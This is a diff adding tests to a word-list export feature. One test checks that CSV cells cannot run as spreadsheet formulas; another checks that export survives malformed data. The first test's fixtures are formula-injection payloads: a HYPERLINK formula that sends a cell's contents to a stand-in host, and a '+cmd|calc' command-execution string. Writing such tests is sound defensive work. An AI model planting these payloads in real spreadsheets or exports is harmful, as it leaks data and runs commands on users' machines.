@@ -50,4 +50,23 @@ describe('exporting the list', () => {
     expect(html).toContain('2 kelime')
     expect(html).not.toContain('*maison*')
   })
+
+  it('does not let a cell run as a spreadsheet formula (CSV)', () => {
+    const evil = { ...maison, lemma: '=HYPERLINK("http://x/?q="&A1,"x")', notes: '+cmd|calc', tags: ['@SUM(1+1)'] }
+    const csv = toCsv([evil], [])
+    expect(csv).toContain(`"'=HYPERLINK(""http://x/?q=""&A1,""x"")"`)
+    expect(csv).toContain("'+cmd|calc")
+    expect(csv).toContain("'@SUM(1+1)")
+    // Ordinary text is left as it is, even a word with a hyphen inside.
+    expect(toCsv([{ ...arbre, lemma: 'peut-être' }], [])).toContain(',peut-être,')
+  })
+
+  it('still exports when a date is unreadable or a word has no meaning', () => {
+    const odd = { ...maison, addedAt: {} as unknown as Date, senses: [] }
+    const state = { ...newWordState(maison, NOW), skills: { recognition: { due: {} } } } as unknown as ReturnType<typeof newWordState>
+    expect(() => toCsv([odd, maison], [state])).not.toThrow()
+    expect(() => toXlsx([odd, maison], [state])).not.toThrow()
+    expect(() => dictionaryHtml([odd, maison], 'fr', 'x')).not.toThrow()
+  })
 })
+
